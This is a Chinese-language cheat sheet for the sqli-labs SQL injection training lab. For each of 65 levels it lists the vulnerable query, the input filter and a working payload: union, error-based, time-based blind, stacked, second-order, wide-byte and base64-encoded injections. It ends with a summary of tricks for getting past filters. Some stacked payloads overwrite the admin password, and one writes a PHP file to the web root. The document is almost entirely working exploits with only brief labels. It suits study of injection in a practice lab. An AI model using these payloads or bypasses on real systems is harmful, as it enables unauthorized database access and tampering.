## 一、GET

### 1、联合查询 [ ' ]

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1' union select 1,database(),3--+
```

### 2、联合查询 [ ]

```python
# SQL语句
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1 union select 1,database(),3--+
```

### 3、联合查询 [ ') ]

```python
# SQL语句
SELECT * FROM users WHERE id=('$id') LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1') union select 1,database(),3--+
```

### 4、联合查询 [ ") ]

```python
# SQL语句
$id = '"' . $id . '"';
SELECT * FROM users WHERE id=($id) LIMIT 0,1
# 过滤语句
无
# Payload
?id=-1") union select 1,database(),3--+
```

### 5、报错注入 [ ' ]

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+
```

### 6、时间盲注sleep [ " ]

```python
# SQL语句
$id = '"'.$id.'"';
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1" and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+
```

### 7、Outfile [ ' )) ]

```python
# SQL语句
SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1')) union select 1,database(),3 into outfile 'D:\range\phpstudy2018\PHPTutorial\WWW\sqli-labs-master\Less-7\a.php'--+
```

### 8、时间盲注sleep [ ' ]

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1'and left(database(),1)>'s'--+
```

### 9、时间盲注sleep [ ' ]

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

### 10、时间盲注sleep [ " ]

```python
# SQL语句
$id = '"'.$id.'"';
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
1"and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```



## 二、POST

### 11、用户名联合查询 [ ' ]

```python
# SQL语句
SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1;
# 过滤语句
无
# Payload
uname=[不存在的用户]' union select 1,database() #&passwd=&submit=Submit
```

### 12、用户名联合查询 [ ") ]

```python
# SQL语句
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"';
SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1;
# 过滤语句
无
# Payload
uname=[不存在的用户]" union select 1,database() #&passwd=&submit=Submit
```

### 13、用户名报错注入 [ ') ]

```python
# SQL语句
SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1;
# 过滤语句
无
# Payload
uname=admin') and updatexml(1, concat(0x7e,(database()),0x7e),1)#&passwd=admin&submit=Submit
```

### 14、用户名报错注入 [ " ]

```python
# SQL语句
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"';
SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1;
# 过滤语句
无
# Payload
uname=admin" and updatexml(1, concat(0x7e,(database()),0x7e),1)#&passwd=admin&submit=Submit
```

### 15、密码时间盲注sleep [ ' ]

```python
# SQL语句
SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1;
# 过滤语句
无
# Payload
admin'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

### 16、密码时间盲注sleep [ ") ]

```python
# SQL语句
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"';
# 过滤语句
SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1;
# Payload
admin" and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

### 17、密码报错注入 [ ' ]

```python
# SQL语句
SELECT username, password FROM users WHERE username= $uname LIMIT 0,1;
# 过滤语句
无
# Payload
admin" and extractvalue(1,concat(0x7e,(database()),0x7e))--+
```

### 18、UA头报错注入 [ ',1,1) ]

```python
# SQL语句
SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1;
# 过滤语句
无
# Payload
' and updatexml(1,concat(0x7e,(select database())),1) and '1' ='1
```

### 19、Referer头报错注入 [ ',1) ]

```python
# SQL语句
SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1;
# 过滤语句
无
# Payload
'and updatexml(1,concat(0x7e,(database())),1)and '1'= '1
```

### 20、Cookie头报错注入 [ ' ]

```python
# SQL语句
SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1;
# 过滤语句
无
# Payload
uname=admin' and 1=2 union select database(),2,3 #
```



## 三、过滤

### 21、Base64编码 [ ') ]

```python
# SQL语句
SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1;
# 过滤语句
$cookee = base64_decode($cookee);
# Payload
JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpIw==# 
```

### 22、Base64编码 [ " ]

```python
# SQL语句
$cookee1 = '"'. $cookee. '"';
SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1;
# 过滤语句
$cookee = base64_decode($cookee);
# Payload
LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj
```

### 23、过滤 -- # %23

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
# Payload
?id=' union select 1,2,database() '
```

### 24、二次注入 [ ' ]

```python
# SQL语句
insert into users ( username, password) values(\"$username\", \"$pass\");
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ;
# 过滤语句
无
# Payload
admin'#
```

### 25、过滤and or

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
$id= preg_replace('/or/i',"", $id);
$id= preg_replace('/AND/i',"", $id);
# Payload
?id=-1' union select 1,2,database()--+
```

### 26、过滤and or 空格 -- #

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
$id= preg_replace('/or/i',"", $id);
$id= preg_replace('/and/i',"", $id);
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
$id= preg_replace('/[\s]/',"", $id);
$id= preg_replace('/[\/\\\\]/',"", $id);
# Payload
?id=0'union%a0select%a01,database(),3%26%26'1'='1
```

### 27、过滤and or 空格 -- # union select

```python
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/select/m',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/union/s',"", $id);
$id= preg_replace('/select/s',"", $id);
$id= preg_replace('/UNION/s',"", $id);
$id= preg_replace('/SELECT/s',"", $id);
$id= preg_replace('/Union/s',"", $id);
$id= preg_replace('/Select/s',"", $id);
# Payload
?id=0'%0aUNion%0aSElect%0a1,database(),3'
```

### 28、过滤/* -- # 空格 union select（大小写）

```MYSQL
# SQL语句
SELECT * FROM users WHERE id=('$id') LIMIT 0,1;
# 过滤语句
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/union\s+select/i',"", $id);
# Payload
?id=0')ununion%0Aselection%0Aselect%0A1,database(),('3
```

### 29、联合查询 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0'union select 1,2,database()--+
```

### 30、联合查询 [ " ]

```mysql
# SQL语句
$id = '"' .$id. '"';
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0" union select 1,2,database()--+
```



## 四、其他

### 31、联合查询 [ ") ]

```mysql
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0") union select 1,2,database()--+
```

### 32、宽字节注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);
$string = preg_replace('/\'/i', '\\\'', $string);
$string = preg_replace('/\"/', "\\\"", $string);
# Payload
?id=0%df' union select 1,2,database()--+
```

### 33、宽字节注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
mysql_query("SET NAMES gbk");
# Payload
?id=0%df' union select 1,2,database()--+
```

### 34、POST + 宽字节注入 [ ' ]

```mysql
# SQL语句
SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1;
# 过滤语句
mysql_query("SET NAMES gbk");
# Payload
uname=admin%df' union select 1,database()#
```

### 35、GET + 宽字节注入 [ ]

```MYSQL
# SQL语句
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
mysql_query("SET NAMES gbk");
# Payload
?id=0 union select 1,database(),3#
```

### 36、GET + 宽字节注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
# 过滤语句
mysql_query("SET NAMES gbk");
# Payload
?id=0%df%27union%20select%201,2,database()--+
```

### 37、POST + 宽字节注入 [ ' ]

```mysql
# SQL语句
SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1;
# 过滤语句
mysql_query("SET NAMES gbk");
# Payload
uname=-admin%df' union select 1,database()--+
```

### 38、联合查询 [ ' ]

```MYSQL
# SQL语句
SELECT * FROM users WHERE id='$id' LIMIT 0,1；
# 过滤语句
无
# Payload
# "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
?id=-1' union select 1,2,database() --+
```

### 39、联合查询 [ ]

```python
# SQL语句
SELECT * FROM users WHERE id=$id LIMIT 0,1；
# 过滤语句
无
# Payload
?id=0 union select 1,2,database()--+
```

### 40、联合查询 [ ') ]

```mysql
# SQL语句
SELECT * FROM users WHERE id=('$id') LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0')union select 1,2,database()--+
```

### 41、联合查询 [ ]

```mysql
# SQL语句
SELECT * FROM users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0 union select 1,2,database() --+
```

### 42、堆叠注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE username='$username' and password='$password'；
# 过滤语句
无
# Payload
123456';update users set password='123456' where username='admin';--+
```

### 43、堆叠注入 [ ') ]

```mysql
# SQL语句
SELECT * FROM users WHERE username=('$username') and password=('$password');
# 过滤语句
无
# Payload
123456');update users set password='123456' where username='admin';--+
```

### 44、堆叠注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users WHERE username='$username' and password='$password'；
# 过滤语句
无
# Payload
12345';update users set password='123456' where username='admin';--+
```

### 45、堆叠注入 [ ') ]

```mysql
# SQL语句
SELECT * FROM users WHERE username=('$username') and password=('$password');
# 过滤语句
无
# Payload
12345');update users set password='123456' where username='admin';--+
```

### 46、报错注入

```python
# SQL语句
SELECT * FROM users ORDER BY $id;
# 过滤语句
无
# Payload
?sort=-1 and extractvalue(1,concat(0x7e,(database()),0x7e)) %23
```

### 47、报错注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY '$id';
# 过滤语句
无
# Payload
?sort=2' and extractvalue(1,concat(0x7e,(database()),0x7e)) %23
```

### 48、时间盲注 [  ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY $id;
# 过滤语句
无
# Payload
?sort=1 and if(((database())='security'),sleep(5),1)--+
```

### 49、时间盲注 [ ' ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY '$id';
# 过滤语句
无
# Payload
?sort=1'and if((database()='security'),sleep(5),1)--+
```

### 50、时间盲注 + 过滤 -- [ ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY $id;
# 过滤语句
无
# Payload
?sort=1%20and%20if((database()=%27security%27),sleep(5),1)#
```

### 51、时间盲注 [ ' ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY '$id';
# 过滤语句
无
# Payload
?sort=1'and if((database()='security'),sleep(5),1)--+
```

### 52、堆叠注入 [ ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY $id;
# 过滤语句
无
# Payload
?sort=1;insert into users values(666,'qwer','qwer')
```

### 53、时间盲注 [ ' ]

```mysql
# SQL语句
SELECT * FROM users ORDER BY '$id';
# 过滤语句
无
# Payload
?sort=1'and if((database()='security'),sleep(5),1)--+
```

### 54、联合查询 [ ' ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1' union select 1,2,group_concat(secret_T9KT) from kwdhafmq5d --+
```

### 55、联合查询 [ ) ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1) union select 1,2,group_concat(secret_ZTCI) from mpf1jj7jjp --+
```

### 56、联合查询 [ ') ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0') union select 1,2,database() --+
```

### 57、联合查询 [ " ]

```mysql
# SQL语句
$id= '"'.$id.'"';
SELECT * FROM security.users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=0" union select 1,2,database()--+
```

### 58、报错注入 [ ' ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+
```

### 59、报错注入

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

### 60、报错注入 [ ") ]

```mysql
# SQL语句
$id = '("'.$id.'")';
SELECT * FROM security.users WHERE id=$id LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1") and updatexml(1,concat(0x7e,concat(database()),0x7e),1)--+
```

### 61、报错注入 [ ')) ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1;
# 过滤语句
无
# Payload
?id=-1')) and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
```

### 62、时间盲注 [ ') ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1') and if((ascii(substr(database(),1,1))=99),sleep(5),1)--+
```

### 63、时间盲注  [ ' ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1%27%20and%20if((ascii(left(database(),1))=99),sleep(5),1)--+
```

### 64、时间盲注  [ )) ]

```mysql
# SQL语句
SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1;
# 过滤语句
无
# Payload
?id=1))%20and%20if((ascii(left(database(),1))=99),sleep(5),1)--+
```

### 65、时间盲注 [ ") ]

```MYSQL
# SQL语句
$id = '"'.$id.'"';
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1;
# 过滤语句

# Payload
?id=1%22)%20and%20if((ascii(left(database(),1))=99),sleep(5),1)--+
```



## N、总结

### 1、等价字符

```
# 空格
%0a %0a
```

```
# and or
^ ||
```

```
# 注释
%23
'(引号闭合，不注释)
;(堆叠注入)
```

```
# union select
UNION SELECT(大写)
ununionion seselectlect(双写)
UnUnionion SeSelectlect(大小混合双写)
```

### 2、注入点

```
1、GET
2、POST
	REFERER
	Cookie
	User Agent
3、登录框
	username
	password
```

### 3、注入手法

```
1、联合查询
2、报错注入
3、延时盲注
4、堆叠注入
5、二次注入
```

